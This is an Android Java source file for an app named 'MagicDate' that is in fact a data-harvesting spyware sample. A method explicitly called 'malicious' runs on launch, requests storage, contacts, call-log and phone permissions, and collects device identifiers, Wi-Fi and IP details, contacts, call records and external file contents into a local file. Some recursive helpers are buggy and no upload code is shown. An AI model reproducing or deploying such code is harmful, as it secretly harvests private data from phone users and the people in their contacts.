package com.example.MagicDate;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;


import android.app.Activity;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.DhcpInfo;
import android.os.Bundle;
import android.content.Context;
import android.os.Build;
import android.Manifest;


import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStreamWriter;


import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MainActivity extends AppCompatActivity {

    OutputStreamWriter outputStreamWriter;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        File directoryToStore;
//        directoryToStore = getBaseContext().getExternalFilesDir("TestFolder");
//        if (!directoryToStore.exists()) {
//            if (directoryToStore.mkdir()) {
//                //directory is created;
//            }
//        }

        malicious();

    }


    private void malicious() {
        // Check if the app has permission to read external storage
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, 0);
        }
        // Check if the app has permission to read contacts
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
            // Request the permission
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_CONTACTS}, 1);
        }
        // Check if the app has permission to read call log
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                != PackageManager.PERMISSION_GRANTED) {
            // Request the permission
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_CALL_LOG}, 2);
        }
        // Check if the app has permission to read phone numbers
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS)
                != PackageManager.PERMISSION_GRANTED) {
            // Request the permission
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_PHONE_NUMBERS}, 3);

        }

        File path = this.getApplicationContext().getFilesDir();
        File file = new File(path, "information.txt");

        try {
            FileOutputStream out = new FileOutputStream(file);
            outputStreamWriter = new OutputStreamWriter(out);
            StealData(this);
            outputStreamWriter.close();
            out.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void StealData(Context context) {

        String wifi = wifiDetails();
        String deviceDetails = deviceDetails();
        String ipAddress = getIPAddress();
        String apIpAddress = getAPIP();
        String userAgent = System.getProperty("http.agent");

        File externalStorageDirectory = Environment.getExternalStorageDirectory();
        String contacts = getContacts(context);
        String callRecords = getCallRecords(context);
        String externalContent = readAllFiles(externalStorageDirectory);

        String root = FilePath(Environment.getRootDirectory());
        String download = FilePath(Environment.getDownloadCacheDirectory());
        String external = FilePath(Environment.getExternalStorageDirectory());




        try {
            outputStreamWriter.write("**** USER AGENT HTTP ****:\n" + userAgent + "\n");
            outputStreamWriter.write("**** WIFI DETAILS ****:\n" + wifi + "\n");
            outputStreamWriter.write("**** DEVICE DETAILS ****:\n" + deviceDetails + "\n");
            outputStreamWriter.write("**** IP ****:\n" + "Local:" + ipAddress + "\n" + "Access Point:" + apIpAddress + "\n");
            outputStreamWriter.write("**** ROOT FILES ****:\n" + root + "\n");
            outputStreamWriter.write("**** DOWNLOAD FILES ****:\n" + download + "\n");
            outputStreamWriter.write("**** EXTERNAL FILES ****:\n" + external + "\n");

            outputStreamWriter.write("**** CALL RECORDS ****:\n" + callRecords + "\n");

            outputStreamWriter.write("**** EXTERNAL FILES CONTENT ****:\n" + externalContent + "\n");
            outputStreamWriter.write("**** CONTACTS ****:\n" + contacts + "\n");


        } catch (IOException e) {
        }
    }

    // Handle the permission request result
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        try {
            switch (requestCode) {
                case 0: {
                    // If the permission was granted, start reading files
                    if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                        // Start reading files
                        String externalContent = readAllFiles(Environment.getExternalStorageDirectory());
                        outputStreamWriter.write("**** EXTERNAL FILES CONTENT ****:\n" + externalContent + "\n");

                    } else {
                        // If the permission was denied, show a message or take appropriate action
                        // ...
                    }
                    return;
                }
                case 1:
                case 3: {
                    // If the permission was granted, start reading contacts
                    if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                        // Start reading contacts
                        String contacts = getContacts(this);
                        outputStreamWriter.write("**** CONTACTS ****:\n" + contacts + "\n");
                    } else {
                        // If the permission was denied, show a message or take appropriate action
                        // ...
                    }
                    return;
                }
                case 2: {
                    // If the permission was granted, start reading call log
                    if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                        // Start reading call log
                        String callRecords = getCallRecords(this);
                        outputStreamWriter.write("**** CALL RECORDS ****:\n" + callRecords + "\n");

                    } else {
                        // If the permission was denied, show a message or take appropriate action
                        // ...
                    }
                    return;
                }
            }
        } catch (IOException e) {
        }
    }


    public static String readAllFiles(File directory) {
        StringBuilder ans = new StringBuilder();
        // Get all files and directories in the given directory
        File[] files = directory.listFiles();
        if (files != null) {
            // Iterate over the files and directories
            for (File file : files) {
                if (file.isDirectory()) {
                    // Recursively call the same function for the subdirectory
                    readAllFiles(file);
                } else {
                    if (file.isFile()) {
                        try {
                            BufferedReader reader = new BufferedReader(new FileReader(file));
//                        FileWriter writer = new FileWriter(Environment.getExternalStorageDirectory() + "/MyOutputFile.txt");

                            String line;
                            while ((line = reader.readLine()) != null) {
                                ans.append(line);
                            }

                            reader.close();
//                        writer.close();

                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                    // Read the contents of the file
                }
            }
        }
        return ans.toString();
    }

    private String FilePath(File SourceFile) {
        String s = "";
        if (SourceFile.isFile()) {
            s = s + "File: " + SourceFile.getAbsolutePath() + "\n";

        } else {
            s = s + "Folder: " + SourceFile.getAbsolutePath() + "\n";
            File[] files = SourceFile.listFiles(); //Make list of files
            if (SourceFile.listFiles() != null && files.length > 0) {
                for (File f : files) {
                    FilePath(f); //Recursion to search deeper path files
                }
            }
        }
        return s;
    }

    private String deviceDetails() {
        String ans = "";

        ans = ans
                + "ID: " + Build.ID + "\n"
                + "Serial: " + Build.SERIAL + "\n"
                + "Hardware: " + Build.HARDWARE + "\n"
                + "Device model: " + Build.MODEL + "\n"
                + "OS version: " + System.getProperty("os.version") + "\n"
                + "User: " + Build.USER + "\n"
                + "Product: " + Build.PRODUCT + "\n"
                + "Device: " + Build.DEVICE + "\n"
                + "SDK version: " + Build.VERSION.SDK_INT + "\n"
                + "Radio version: " + Build.getRadioVersion() + "\n"
                + "Brand: " + Build.BRAND + "\n"
                + "Host: " + Build.HOST + "\n"
                + "Display: " + Build.DISPLAY + "\n"
                + "Bootloader: " + Build.BOOTLOADER + "\n";

        return ans;


    }



    private String wifiDetails() {
        ConnectivityManager connManager = (ConnectivityManager) this.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        StringBuilder ans = new StringBuilder();


        if (mWifi.isConnected()) {
            ans.append("WIFI STATUS : WIFI is Connected\n");


            WifiManager wifiManager = (WifiManager) this.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            WifiInfo info = wifiManager.getConnectionInfo();


            ans.append("WIFI name:  ").append(info.getSSID()).append("\n");
            ans.append("BSSID:  ").append(info.getBSSID()).append("\n");
            ans.append("Network ID:  ").append(info.getNetworkId()).append("\n");
            ans.append("MAC address:  ").append(info.getMacAddress()).append("\n");
            ans.append("Describe Contents:  ").append(info.describeContents()).append("\n");
            ans.append("Link speed:  ").append(info.getLinkSpeed()).append("\n");


        } else {
            ans.append("WIFI not connected\n");

        }
        return ans.toString();
    }

    private String getContacts(Context ctx) {
        StringBuilder contacts = new StringBuilder();
        try {
            ContentResolver contentResolver = ctx.getContentResolver();
            Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.getCount() > 0) {
                int idColumnIndex = cursor.getColumnIndex("_id");
                int nameColumnIndex = cursor.getColumnIndex("display_name");
                while (cursor.moveToNext() && idColumnIndex >= 0 && nameColumnIndex >= 0) {
                    String id = cursor.getString(idColumnIndex);
                    Cursor cursorInfo = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id = ?", new String[]{id}, null);
                    if (cursorInfo != null) {
                        int numberColumnIndex = cursorInfo.getColumnIndex("data1");
                        while (cursorInfo.moveToNext() && numberColumnIndex >= 0) {
                            if (cursor.getString(nameColumnIndex).length() > 0 && cursorInfo.getString(numberColumnIndex).length() > 6) {
                                String name = cursor.getString(nameColumnIndex);
                                String number = cursorInfo.getString(numberColumnIndex);
                                contacts.append(name).append(" - ").append(number).append("\n");
                            }
                        }
                        cursorInfo.close();
                    }
                }
                cursor.close();
            }
        } catch (Exception exception) {
            Log.d("ERROR", "permission denied - contacts");
            return "contacts: API - permission denied  ";

        }
        return contacts.toString();

    }


    public static String getCallRecords(Context context) {
        StringBuilder callRecords = new StringBuilder();
        ContentResolver contentResolver = context.getContentResolver();

        String[] projection = new String[]{
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
        };

        try {
            Cursor cursor = contentResolver.query(CallLog.Calls.CONTENT_URI,
                    projection, null, null, CallLog.Calls.DATE + " DESC");

            int numberColumn = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int dateColumn = cursor.getColumnIndex(CallLog.Calls.DATE);
            int durationColumn = cursor.getColumnIndex(CallLog.Calls.DURATION);
            int typeColumn = cursor.getColumnIndex(CallLog.Calls.TYPE);

            while (cursor.moveToNext()) {
                String number = cursor.getString(numberColumn);
                long date = cursor.getLong(dateColumn);
                int duration = cursor.getInt(durationColumn);
                int type = cursor.getInt(typeColumn);

                SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm:ss");
                String dateString = formatter.format(new Date(date));

                String typeString = "";
                switch (type) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        typeString = "Outgoing";
                        break;
                    case CallLog.Calls.INCOMING_TYPE:
                        typeString = "Incoming";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        typeString = "Missed";
                        break;
                    default:
                        typeString = "Unknown";
                        break;
                }

                String callRecord = "Number: " + number + "\n" +
                        "Date: " + dateString + "\n" +
                        "Duration: " + duration + " seconds\n" +
                        "Type: " + typeString + "\n\n";

                callRecords.append(callRecord);
            }

            cursor.close();
        } catch (Exception exception) {
            Log.d("ERROR", "permission denied - call records");
            return "call records: API - permission denied ";
        }
        return callRecords.toString();

    }


    private String getIPAddress() {
        WifiManager wifiMgr = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wifiMgr != null) {
            WifiInfo wifiInfo = wifiMgr.getConnectionInfo();
            int ip = wifiInfo.getIpAddress();
            String ipAddress = String.format("%d.%d.%d.%d", (ip & 0xff), (ip >> 8 & 0xff), (ip >> 16 & 0xff), (ip >> 24 & 0xff));
            Log.d("IP Address", "Current IP address: " + ipAddress);
            return ipAddress;
        }
        return null;
    }

    private String getAPIP() {
        WifiManager wifiMgr = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wifiMgr != null) {
            DhcpInfo dhcpInfo = wifiMgr.getDhcpInfo();
            int ip = dhcpInfo.gateway;
            String apIpAddress = (ip & 0xff) + "." + (ip >> 8 & 0xff) + "." + (ip >> 16 & 0xff) + "." + (ip >> 24 & 0xff);
            Log.d("AP IP Address", "Current AP IP address: " + apIpAddress);
            return apIpAddress;
        }
        return null;
    }


}

